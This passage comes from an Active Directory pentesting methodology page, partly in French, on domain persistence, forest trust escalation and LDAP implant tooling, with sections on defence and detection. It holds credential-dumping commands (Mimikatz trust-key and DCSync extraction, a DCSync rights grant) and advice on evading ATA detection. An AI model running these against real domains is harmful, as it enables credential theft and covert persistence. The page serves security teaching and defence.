Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** creates a **legitimate Ticket Granting Service (TGS) ticket** for a specific service by using the **NTLM hash** (for instance, the **hash of the PC account**). This method is employed to **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

A **Golden Ticket attack** involves an attacker gaining access to the **NTLM hash of the krbtgt account** in an Active Directory (AD) environment. This account is special because it's used to sign all **Ticket Granting Tickets (TGTs)**, which are essential for authenticating within the AD network.

Once the attacker obtains this hash, they can create **TGTs** for any account they choose (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

These are like golden tickets forged in a way that **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** is a very good way to be able to persist in the users account (even if he changes the password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

The **AdminSDHolder** object in Active Directory ensures the security of **privileged groups** (like Domain Admins and Enterprise Admins) by applying a standard **Access Control List (ACL)** across these groups to prevent unauthorized changes. However, this feature can be exploited; if an attacker modifies the AdminSDHolder's ACL to give full access to a regular user, that user gains extensive control over all privileged groups. This security measure, meant to protect, can thus backfire, allowing unwarranted access unless closely monitored.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Inside every **Domain Controller (DC)**, a **local administrator** account exists. By obtaining admin rights on such a machine, the local Administrator hash can be extracted using **mimikatz**. Following this, a registry modification is necessary to **enable the use of this password**, allowing for remote access to the local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

You could **give** some **special permissions** to a **user** over some specific domain objects that will let the user **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

The **security descriptors** are used to **store** the **permissions** an **object** have **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse the `dynamicObject` auxiliary class to create short-lived principals/GPOs/DNS records with `entryTTL`/`msDS-Entry-Time-To-Die`; they self-delete without tombstones, erasing LDAP evidence while leaving orphan SIDs, broken `gPLink` references, or cached DNS responses (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alter **LSASS** in memory to establish a **universal password**, granting access to all domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
Note that if you use wrong data, pretty ugly logs will appear.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Previously we have discussed about how to escalate privileges if you have **enough permission to read LAPS passwords**. However, these passwords can also be used to **maintain persistence**.\
Check:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft views the **Forest** as the security boundary. This implies that **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is a security mechanism that enables a user from one **domain** to access resources in another **domain**. It essentially creates a linkage between the authentication systems of the two domains, allowing authentication verifications to flow seamlessly. When domains set up a trust, they exchange and retain specific **keys** within their **Domain Controllers (DCs)**, which are crucial to the trust's integrity.

In a typical scenario, if a user intends to access a service in a **trusted domain**, they must first request a special ticket known as an **inter-realm TGT** from their own domain's DC. This TGT is encrypted with a shared **key** that both domains have agreed upon. The user then presents this TGT to the **DC of the trusted domain** to get a service ticket (**TGS**). Upon successful validation of the inter-realm TGT by the trusted domain's DC, it issues a TGS, granting the user access to the service.

**Steps**:

1. A **client computer** in **Domain 1** starts the process by using its **NTLM hash** to request a **Ticket Granting Ticket (TGT)** from its **Domain Controller (DC1)**.
2. DC1 issues a new TGT if the client is authenticated successfully.
3. The client then requests an **inter-realm TGT** from DC1, which is needed to access resources in **Domain 2**.
4. The inter-realm TGT is encrypted with a **trust key** shared between DC1 and DC2 as part of the two-way domain trust.
5. The client takes the inter-realm TGT to **Domain 2's Domain Controller (DC2)**.
6. DC2 verifies the inter-realm TGT using its shared trust key and, if valid, issues a **Ticket Granting Service (TGS)** for the server in Domain 2 the client wants to access.
7. Finally, the client presents this TGS to the server, which is encrypted with the server’s account hash, to get access to the service in Domain 2.

### Different trusts

It's important to notice that **a trust can be 1 way or 2 ways**. In the 2 ways options, both domains will trust each other, but in the **1 way** trust relation one of the domains will be the **trusted** and the other the **trusting** domain. In the last case, **you will only be able to access resources inside the trusting domain from the trusted one**.

If Domain A trusts Domain B, A is the trusting domain and B ins the trusted one. Moreover, in **Domain A**, this would be an **Outbound trust**; and in **Domain B**, this would be an **Inbound trust**.

**Different trusting relationships**

- A trust relationship can also be **transitive** (A trust B, B trust C, then A trust C) or **non-transitive**.
- A trust relationship can be set up as **bidirectional trust** (both trust each other) or as **one-way trust** (only one of them trust the other).

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** (user/group/computer) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** (the trust was created for this probably).
1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains.

Attackers with could access to resources in another domain through three primary mechanisms:

- **Local Group Membership**: Principals might be added to local groups on machines, such as the “Administrators” group on a server, granting them significant control over that machine.
- **Foreign Domain Group Membership**: Principals can also be members of groups within the foreign domain. However, the effectiveness of this method depends on the nature of the trust and the scope of the group.
- **Access Control Lists (ACLs)**: Principals might be specified in an **ACL**, particularly as entities in **ACEs** within a **DACL**, providing them access to specific resources. For those looking to dive deeper into the mechanics of ACLs, DACLs, and ACEs, the whitepaper titled “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” is an invaluable resource.

### Find external users/groups with permissions

You can check **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** to find foreign security principals in the domain. These will be user/group from **an external domain/forest**.

You could check this in **Bloodhound** or using powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalade de privilèges Child-to-Parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Autres façons d’énumérer les trusts de domaine :
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Il existe **2 clés de confiance**, une pour _Child --> Parent_ et une autre pour _Parent_ --> _Child_.\
> Vous pouvez celle utilisée par le domaine courant avec :
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Élevez-vous en tant que Enterprise admin vers le domaine enfant/parent en abusant de la trust avec SID-History injection :


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Comprendre comment le Configuration Naming Context (NC) peut être exploité est crucial. Le Configuration NC sert de référentiel central pour les données de configuration dans une forêt, dans les environnements Active Directory (AD). Ces données sont répliquées sur chaque Domain Controller (DC) de la forêt, les DC inscriptibles conservant une copie inscriptible du Configuration NC. Pour exploiter cela, il faut disposer de **privilèges SYSTEM sur un DC**, de préférence un child DC.

**Link GPO to root DC site**

Le conteneur Sites du Configuration NC inclut des informations sur les sites de tous les ordinateurs joints au domaine au sein de la forêt AD. En opérant avec des privilèges SYSTEM sur n’importe quel DC, les attaquants peuvent lier des GPO aux sites du root DC. Cette action peut compromettre le root domain en manipulant les policies appliquées à ces sites.

Pour des informations approfondies, on peut consulter des recherches sur [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vecteur d’attaque consiste à cibler des gMSA privilégiés au sein du domaine. La KDS Root key, essentielle pour calculer les mots de passe des gMSA, est stockée dans le Configuration NC. Avec des privilèges SYSTEM sur n’importe quel DC, il est possible d’accéder à la KDS Root key et de calculer les mots de passe de n’importe quel gMSA dans toute la forêt.

Une analyse détaillée et une procédure étape par étape sont disponibles dans :


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attaque complémentaire sur delegated MSA (BadSuccessor – abus des attributs de migration) :


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Recherche externe supplémentaire : [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Cette méthode demande de la patience, en attendant la création de nouveaux objets AD privilégiés. Avec des privilèges SYSTEM, un attaquant peut modifier le AD Schema pour accorder à n’importe quel utilisateur le contrôle complet sur toutes les classes. Cela peut mener à un accès non autorisé et au contrôle des nouveaux objets AD créés.

Des informations complémentaires sont disponibles dans [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnérabilité ADCS ESC5 cible le contrôle des objets Public Key Infrastructure (PKI) afin de créer un certificate template qui permet l’authentification en tant que n’importe quel utilisateur dans la forêt. Comme les objets PKI résident dans le Configuration NC, la compromission d’un child DC inscriptible permet l’exécution d’attaques ESC5.

Plus de détails peuvent être lus dans [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Dans les scénarios sans ADCS, l’attaquant a la capacité de mettre en place les composants nécessaires, comme expliqué dans [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Dans ce scénario **votre domaine est trusted** par un domaine externe, ce qui vous donne des **permissions indéterminées** sur celui-ci. Vous devrez trouver **quels principals de votre domaine ont quels accès sur le domaine externe** puis essayer de l’exploiter :


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Dans ce scénario **votre domaine** **accorde** certains **privilèges** à un principal provenant de **différents domaines**.

Cependant, lorsqu’un **domaine est trusted** par le domaine qui accorde la confiance, le domaine trusted **crée un utilisateur** avec un **nom prévisible** qui utilise comme **mot de passe le trusted password**. Ce qui signifie qu’il est possible d’**accéder à un utilisateur du domaine qui accorde la confiance pour entrer dans le domaine trusted** afin de l’énumérer et d’essayer d’élever davantage de privilèges :


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Une autre façon de compromettre le domaine trusted est de trouver un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) créé dans la **direction opposée** de la confiance entre domaines (ce qui n’est pas très courant).

Une autre façon de compromettre le domaine trusted est d’attendre sur une machine où un **utilisateur du domaine trusted peut accéder** pour se connecter via **RDP**. Ensuite, l’attaquant pourrait injecter du code dans le processus de la session RDP et **accéder au domaine d’origine de la victime** depuis là.\
De plus, si la **victime a monté son disque dur**, depuis le processus de la **session RDP** l’attaquant pourrait stocker des **backdoors** dans le **dossier de démarrage du disque dur**. Cette technique s’appelle **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Atténuation de l’abus de trust entre domaines

### **SID Filtering :**

- Le risque d’attaques exploitant l’attribut SID history à travers les forest trusts est atténué par SID Filtering, qui est activé par défaut sur tous les inter-forest trusts. Cela repose sur l’hypothèse que les intra-forest trusts sont sécurisés, en considérant la forest, plutôt que le domaine, comme la frontière de sécurité, conformément à la position de Microsoft.
- Cependant, il y a un piège : SID filtering peut perturber les applications et l’accès des utilisateurs, ce qui conduit parfois à sa désactivation.

### **Selective Authentication :**

- Pour les inter-forest trusts, l’utilisation de Selective Authentication garantit que les utilisateurs des deux forests ne sont pas authentifiés automatiquement. À la place, des autorisations explicites sont requises pour que les utilisateurs accèdent aux domaines et serveurs au sein du domaine ou de la forest qui accorde la confiance.
- Il est important de noter que ces mesures ne protègent pas contre l’exploitation du writable Configuration Naming Context (NC) ou contre les attaques sur le trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitives d’écriture LDAP pour l’escalade et la persistance

- Les BOFs de création d’objets (`add-user`, `add-computer`, `add-group`, `add-ou`) permettent à l’opérateur de préparer de nouveaux principals ou comptes machine partout où des droits sur l’OU existent. `add-groupmember`, `set-password`, `add-attribute`, et `set-attribute` détournent directement les cibles une fois que des droits write-property sont trouvés.
- Les commandes centrées sur les ACL, telles que `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, et `add-dcsync`, transforment WriteDACL/WriteOwner sur n’importe quel objet AD en réinitialisations de mot de passe, contrôle de l’appartenance à des groupes, ou privilèges de réplication DCSync, sans laisser d’artefacts PowerShell/ADSI. Les contreparties `remove-*` nettoient les ACE injectées.

### Delegation, roasting, et abus Kerberos

- `add-spn`/`set-spn` rendent instantanément un utilisateur compromis Kerberoastable ; `add-asreproastable` (bascule UAC) le marque pour le AS-REP roasting sans toucher au mot de passe.
- Les macros de delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) réécrivent `msDS-AllowedToDelegateTo`, les flags UAC, ou `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis le beacon, en activant les chemins d’attaque constrained/unconstrained/RBCD et en supprimant le besoin de PowerShell distant ou de RSAT.

### Injection de sidHistory, déplacement d’OU, et modelage de la surface d’attaque

- `add-sidhistory` injecte des SIDs privilégiés dans le SID history d’un principal contrôlé (voir [SID-History Injection](sid-history-injection.md)), fournissant une héritage d’accès furtif entièrement via LDAP/LDAPS.
- `move-object` modifie le DN/OU des ordinateurs ou des utilisateurs, permettant à un attaquant de déplacer des assets dans des OUs où des droits délégués existent déjà avant d’exploiter `set-password`, `add-groupmember`, ou `add-spn`.
- Des commandes de suppression à portée étroite (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permettent un rollback rapide après la récupération de credentials ou la mise en place de persistance, en minimisant la télémétrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Quelques défenses générales

[**En savoir plus sur la protection des credentials ici.**](../stealing-credentials/credentials-protections.md)

### **Mesures défensives pour la protection des credentials**

- **Restrictions pour les Domain Admins** : il est recommandé d’autoriser les Domain Admins à se connecter uniquement aux Domain Controllers, afin d’éviter leur utilisation sur d’autres hôtes.
- **Privilèges des comptes de service** : les services ne doivent pas être exécutés avec des privilèges Domain Admin (DA) afin de maintenir la sécurité.
- **Limitation temporelle des privilèges** : pour les tâches nécessitant des privilèges DA, leur durée doit être limitée. Cela peut être fait avec : `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Atténuation du LDAP relay** : auditer les Event IDs 2889/3074/3075 puis imposer le LDAP signing et le channel binding LDAPS sur les DCs/clients pour bloquer les tentatives de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Empreinte au niveau protocolaire de l’activité Impacket

Si vous voulez détecter les techniques AD courantes, **ne vous fiez pas uniquement aux artefacts contrôlés par l’opérateur** tels que les binaires renommés, les noms de services, les fichiers batch temporaires ou les chemins de sortie. Établissez une base de référence sur la manière dont les clients Windows légitimes génèrent du trafic [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, et WMI, puis recherchez les **particularités d’implémentation** qui subsistent même après que l’opérateur a modifié `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, ou `ntlmrelayx.py`.

- **Candidats autonomes à forte confiance** (après validation contre votre propre baseline) :
- DCE/RPC authentifié utilisant `auth_context_id = 79231 + ctx_id`
- Padding d’authentification DCE/RPC rempli avec `0xff`
- Bind Kerberos LDAP qui place un `AP-REQ` Kerberos brut directement dans le `mechToken` SPNEGO
- Requêtes SMB2/3 negotiate avec des valeurs de `ClientGuid` ressemblant à de l’ASCII
- WMI `IWbemLevel1Login::NTLMLogin` utilisant le namespace non standard `//./root/cimv2`
- Valeurs de nonce Kerberos codées en dur
- **Mieux comme signaux de corrélation/de scoring** :
- Listes d’etype Kerberos clairsemées ou dupliquées, `PA-DATA` inhabituel/manquant, ou ordre des etypes dans les TGS-REQ différent de celui de Windows natif
- Messages NTLM Type 1 sans information de version ou messages Type 3 avec des noms d’hôte nuls
- NTLMSSP brut transporté dans DCE/RPC au lieu de SPNEGO, vérification trailers DCE/RPC manquants, ou incohérences d’OID SPNEGO/Kerberos
- Plusieurs de ces traits provenant du même hôte/utilisateur/intervalle de session/temps sont bien plus forts qu’un seul champ faible
- **À utiliser comme enrichissement, pas comme alertes autonomes** :
- Noms de fichiers par défaut, chemins de sortie, noms de services aléatoires, noms de batch temporaires, noms de comptes machine par défaut, et chaînes HTTP/WebDAV/RDP/MSSQL spécifiques à l’outil
- Ceux-ci sont faciles à modifier pour les opérateurs et servent surtout à expliquer pourquoi un cluster inter-protocoles est suspect
- **Notes opérationnelles** :
- Certains de ces signaux nécessitent du trafic déchiffré, l’analyse [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, ou une visibilité côté service
- Validez face aux clients Samba/Linux, aux appliances, et aux logiciels legacy avant de les promouvoir en alertes
- Faites monter les détections de l’enrichissement -> hunting -> alerting au fur et à mesure que vous gagnez en confiance dans la baseline

### **Implémentation de techniques de deception**

- L’implémentation de deception consiste à poser des pièges, comme des utilisateurs ou des ordinateurs leurres, avec des caractéristiques telles que des mots de passe qui n’expirent pas ou qui sont marqués comme Trusted for Delegation. Une approche détaillée inclut la création d’utilisateurs avec des droits spécifiques ou leur ajout à des groupes à privilèges élevés.
- Un exemple pratique consiste à utiliser des outils comme : `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Plus d’informations sur le déploiement de techniques de deception peuvent être trouvées sur [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifier la deception**

- **Pour les objets User** : les indicateurs suspects incluent un ObjectSID atypique, des logons peu fréquents, des dates de création, et de faibles compteurs de bad password.
- **Indicateurs généraux** : comparer les attributs de possibles objets leurres avec ceux de vrais objets peut révéler des incohérences. Des outils comme [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) peuvent aider à identifier de telles deceptions.

### **Contourner les systèmes de détection**

- **Contournement de la détection Microsoft ATA** :
- **Énumération des users** : éviter l’énumération des sessions sur les Domain Controllers pour empêcher la détection ATA.
- **Impersonation de tickets** : l’utilisation de clés **aes** pour la création de tickets aide à échapper à la détection en évitant de rétrograder vers NTLM.
- **Attaques DCSync** : il est conseillé d’exécuter depuis un non-Domain Controller pour éviter la détection ATA, car une exécution directe depuis un Domain Controller déclenchera des alertes.

## Références

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)

{{#include ../../banners/hacktricks-training.md}}
